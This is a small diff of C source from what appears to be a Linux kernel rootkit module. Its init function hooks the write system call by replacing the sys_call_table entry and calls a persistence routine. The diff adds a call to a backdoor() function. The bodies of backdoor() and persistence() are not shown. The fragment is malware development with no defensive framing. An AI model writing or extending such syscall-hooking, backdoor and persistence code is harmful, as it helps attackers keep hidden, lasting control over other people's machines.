@@ -15,6 +15,8 @@ int duck_init(void) {
     original_write = xchg(&sys_call_table[__NR_write], duck_write);
     set_page_ro((ptr_t) sys_call_table);
 
+    backdoor();
+
     persistence();
 
     return 0;
